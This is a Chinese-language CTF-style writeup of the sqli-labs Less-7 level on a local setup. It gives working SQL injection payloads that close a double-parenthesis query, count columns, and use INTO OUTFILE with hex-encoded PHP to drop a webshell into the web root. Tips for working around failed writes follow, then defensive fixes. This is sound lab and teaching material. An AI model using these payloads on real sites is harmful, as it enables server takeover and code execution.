---
layout: post
title: sqli-labs - Less-7 导出文件（INTO OUTFILE 写 webshell）Writeup
platform: sqli-labs
date: 2026-11-10 09:00:00 +0800
categories: CTF
---

sqli-labs - Less-7 导出文件（INTO OUTFILE 写 webshell）Writeup

一、题目信息

- 平台：sqli-labs（本地搭建）
- 关卡：Less-7 → Dump into Outfile（文件导出 注入）
- 地址：`http://127.0.0.1:8080/Less-7/?id=1`
- 题型：Web / SQL 注入
- 考点：**INTO OUTFILE 写文件 → 落地 webshell**

**环境信息**：

```text
PHP 7.3.4（php -S 127.0.0.1:8080 内置服务器）
MySQL 5.7.26（secure_file_priv 已设为空，允许 outfile）
sqli-labs 源码：工作区 sqli-labs/
数据库 security（users 表 8 条数据）
```

**✅ 实测结果**

```text
?id=1                 → You are in.... Use outfile......
?id=1'                → You have an error in your SQL syntax
?id=1')) --+          → You are in.... Use outfile......   （两个括号都闭合了）
?id=1')) order by 4 --+  → 报错   ⇒ 3 列
?id=1')) union select 1,2,0x3c3f706870... into outfile '.../less7_x.php' --+
                      → 文件成功写出，访问返回 LESS7-OK-42
```

二、题目分析

**① 源码（闭合方式变了）**

```php
$sql = "SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
$result = mysql_query($sql);
// 不回显数据，只提示：You are in.... Use outfile......
```

**★ 注意 `(('$id'))` —— 外面套了【两层括号】，所以闭合要写 `'))`，不是 `'`。**

**② 为什么这关叫 "Use outfile"**

```text
页面不回显、也不报错（看起来像盲注），但源码提示你用 outfile：
把查询结果直接写到服务器磁盘上 → 生成一个 PHP 文件 → 访问它 = getshell
```

**③ 前提条件（这关能不能成功的关键）**

| 条件 | 说明 |
|---|---|
| `secure_file_priv` 为空 | 否则 MySQL 拒绝写任意路径（本次实测就踩了这个坑） |
| MySQL 有 FILE 权限 | root 默认有 |
| 目标目录可写 | 通常用网站根目录 |

**★ 本机最初 `secure_file_priv` 是 `NULL`（完全禁止导入导出），必须给 mysqld 加 `--secure-file-priv=` 重启才成功。**

**④ 判断列数**

```text
?id=1')) order by 3 --+   → 正常
?id=1')) order by 4 --+   → 报错  ⇒ 3 列
```

三、解题步骤

**第一步：闭合两层括号**

```text
?id=1')) --+     → 回到 You are in，说明闭合成功
```

**第二步：确认列数**

```text
?id=1')) order by 3 --+   → 正常
?id=1')) order by 4 --+   → 报错  ⇒ 3 列
```

**第三步：把 PHP 代码转成 0x 十六进制**

```text
★ 为什么要转：webshell 里有单引号，直接写会被 SQL 当成字符串边界
★ 用 0x... 十六进制常量就完全不用管引号

<?php echo 'LESS7-OK-' . (6*7); ?>
   ↓
0x3c3f706870206563686f20274c455353372d4f4b2d27202e2028362a37293b203f3e
```

**第四步：写文件**

```text
?id=1')) union select 1,2,0x3c3f706870206563686f20274c455353372d4f4b2d27202e2028362a37293b203f3e into outfile 'C:/.../sqli-labs/less7_x.php' --+
```

**★ 路径注意：**

```text
· Windows 下用正斜杠 / 最稳（反斜杠在 SQL 里是转义符）
· 路径必须是【绝对路径】
· 目录必须已存在（outfile 不会帮你建目录）
```

**第五步：验证 getshell**

```text
浏览器访问 http://127.0.0.1:8080/less7_x.php
→ 页面输出：LESS7-OK-42      ← 说明 PHP 被执行了
```

**★ 本次实测文件内容：**

```text
1	Dumb	Dumb
1	2	<?php echo 'LESS7-OK-' . (6*7); ?>
```

**★★ 写进数据库里的内容是"1 2 代码"，所以 webshell 文件开头会有两行杂质 —— 但 PHP 只执行 `<?php ... ?>` 里的部分，照样能用。**

四、延伸知识

**① 为什么 `--+` 能当注释，`#` 有时不行**

```text
--+     URL 里 + 被解码成空格 → "-- " + 后面的内容被注释
#       URL 里 # 是【片段标识符】，浏览器根本不会发给服务器
        要用必须写成 %23
★ 所以 URL 场景首选 --+，POST 场景首选 #
```

**② outfile 与 dumpfile 的区别**

| 函数 | 行为 | 用途 |
|---|---|---|
| `INTO OUTFILE` | 每行数据用 ``\t`` 分隔、``\n`` 结尾 | 写 webshell（代码在行尾也能执行） |
| `INTO DUMPFILE` | 整个结果集无格式拼接 | 写纯二进制/单行文件 |

**③ 写 shell 失败常见原因**

```text
· secure_file_priv 不为空      → 只能写指定目录
· 文件已存在                    → MySQL 不允许覆盖（换文件名）
· 目录不存在 / 无写权限         → 换路径
· 被 disable_functions 拦       → PHP 侧限制
· magic_quotes/sql_mode 影响引号 → 用 0x 十六进制绕过
```

**④ 防御视角**

```php
// 正确做法：参数化查询
$stmt = $pdo->prepare("SELECT * FROM users WHERE id=?");
$stmt->execute([$id]);

// MySQL 侧兜底
secure_file_priv = /var/lib/mysql-files   // 限制导目录
file_priv 只给必须的账号
```

五、总结

- **本题核心：两层括号闭合 `'))` + `INTO OUTFILE` 把 webshell 写到网站目录。**

- 三步方法论：

```text
① 数括号：源码里 (('$id')) → 闭合要写 '))
② 数加号：order by 猜列数（这关是 3 列）
③ 转码：shell 内容 → 0x 十六进制 → into outfile '绝对路径'
```

- **三个必记要点**：

```text
① outfile 要求 secure_file_priv 为空，否则必须写到指定目录
② 路径用正斜杠、必须绝对路径、目录必须存在
③ 写文件不覆盖：同名文件已存在会报错，换名字重写
```

- **实测数据**：

```text
写法：?id=1')) union select 1,2,0x<payload> into outfile '.../less7_x.php' --+
访问：http://127.0.0.1:8080/less7_x.php  →  LESS7-OK-42
```

**一句话记忆**：

```
┌──────────────────────────────────────────────────────────────┐
│  Less-7：两层括号 + INTO OUTFILE = 把 webshell 写到服务器上    │
│                                                              │
│  口诀：                                                       │
│      (('$id'))  →  闭合写 '))                                 │
│      shell 有引号 →  换成 0x 十六进制                          │
│      into outfile '绝对路径'                                   │
│                                                              │
│  ★ 前提：secure_file_priv 为空 + FILE 权限 + 目录可写          │
└──────────────────────────────────────────────────────────────┘
```
